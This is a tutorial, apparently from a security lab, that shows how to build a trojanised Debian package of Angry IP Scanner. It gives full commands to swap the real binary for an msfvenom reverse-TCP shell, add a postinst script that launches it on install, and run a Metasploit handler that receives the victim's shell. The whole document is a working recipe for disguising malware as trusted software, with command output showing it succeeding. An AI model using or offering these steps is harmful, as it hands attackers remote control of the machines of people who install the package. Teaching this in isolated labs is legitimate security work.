# Package a Linux Trojan
Follow the steps below to package a Metasploit Trojan payload in an Ubuntu `deb` package.
We use Kali Linux to package the `deb` because it pre-installs `Metasploit` that we need to use later.

We will use the package `ipscan`; you should `wget` this legitimate version:
```
wget https://github.com/angryip/ipscan/releases/download/3.5.5/ipscan_3.5.5_amd64.deb
```
Suppose that the package `ipscan` is downloaded at `~/Desktop`. We will create a Trojan version in a new directory:
```
mkdir ipscan_trojan
mv ipscan_3.5.5_amd64.deb ipscan_trojan/
cd ipscan_trojan/
```
We need to extract the package to a working directory and create a `DEBIAN` directory:
```
(root💀kali)-[/home/vagrant/Desktop/ipscan_trojan]
└─# dpkg -x ipscan_3.5.5_amd64.deb work
(root💀kali)-[/home/vagrant/Desktop/ipscan_trojan]
└─# mkdir work/DEBIAN
```
Now in the `DEBIAN` directory, we need to create a `control` file that contains the following:
```
Package: ipscan
Section: net
Version: 3.5.5-1
Priority: optional
Architecture: amd64
Installed-Size: 1940
Depends: openjdk-11-jre | openjdk-10-jre | oracle-java10-installer | openjdk-9-jre | oracle-java9-installer | openjdk-8-jre | oracle-java8-installer | openjdk-7-jre | oracle-java7-installer
Maintainer: Anton Keks <anton@azib.net>
Description: Angry IP Scanner - fast and friendly IP Scanner
 Angry IP Scanner is a cross-platform network scanner written in Java.
 It can scan IP-based networks in any range, scan ports, and resolve
 other information.
 The program provides an easy to use GUI interface and is very extensible,
 see https://angryip.org/ for more information.
```
You can obtain the information above from the legitimate `ipscan`:
```
dpkg-deb -I /home/vagrant/Desktop/ipscan_trojan/ipscan_3.5.5_amd64.deb control
```
Note that `/home/vagrant/Desktop/ipscan_trojan/ipscan_3.5.5_amd64.deb` is the legitimate package that we are working on.
We also need to create a post-installation script. In `DEBIAN/` we will create a `postinst` file that contains the following information:
```
#!/bin/sh

sudo chmod 2755 /usr/bin/ipscan && /usr/bin/ipscan &
```
Now we create our payload:
```
(root💀kali)-[/home/…/Desktop/ipscan_trojan/work/DEBIAN]
└─# msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.33.12 LPORT=443 -b "\x00" -f elf -o /home/vagrant/Desktop/ipscan_trojan/work/usr/bin/ipscan
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=55, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 175 (iteration=0)
x64/xor chosen with final size 175
Payload size: 175 bytes
Final size of elf file: 295 bytes
Saved as: /home/vagrant/Desktop/ipscan_trojan/work/usr/bin/ipscan
```
Note that the package works on x86-64 Linux (alas the parameters used in `-a` and `--platform`. We use `reverse_tcp` as the payload.
`LHOST` is the malicious host that accepts the reverse connection. In our case, the IP address of our malicious server is `192.168.33.12`.
You can know the server's IP address by running the `ifconfig` command (you can also specific the IP address in `Vagrantfile`).
You should be able to pick a random free port; we pick `443`.
Finally, we do:
```
(root💀kali)-[/home/…/Desktop/ipscan_trojan/work/DEBIAN]
└─# chmod 755 postinst
                                                                                                 
┌──(root💀kali)-[/home/…/Desktop/ipscan_trojan/work/DEBIAN]
└─# dpkg-deb --build /home/vagrant/Desktop/ipscan_trojan/work
dpkg-deb: building package 'ipscan' in '/home/vagrant/Desktop/ipscan_trojan/work.deb'.
```
Now we should see:
```
(root💀kali)-[/home/vagrant/Desktop/ipscan_trojan]
└─# ls
ipscan_3.5.5_amd64.deb  work  work.deb
```
We should rename `work.deb` to `ipscan_3.5.5_amd64.deb` and store it somewhere else. This is the malicious `deb` package.

# Attack
We set up the Metasploit `multi/handler` to receive the incoming connection from a victim machine to the malicious server (`192.168.33.12`).
This setup is done at the server side, which in our case is the same machine that package the malicious `dev` package.
Run the following command after `sudo su`:
```
(root💀kali)-[/home/vagrant/Desktop/ipscan_trojan]
└─# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST 192.168.33.12; set LPORT 443; run; exit -y"
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => linux/x64/shell/reverse_tcp
LHOST => 192.168.33.12
LPORT => 443
[*] Started reverse TCP handler on 192.168.33.12:443

```
The server is now waiting for any reverse TCP connection.

When a victim machine download and install this malicious package:
```
sudo dpkg -i ipscan_3.5.5_amd64.deb
```
We should see something like this on the server side:
```
[*] Sending stage (38 bytes) to 192.168.33.8
[*] Command shell session 1 opened (192.168.33.12:443 -> 192.168.33.8:35518) at 2021-06-03 12:23:29 -0400

```

## Reference:
https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/
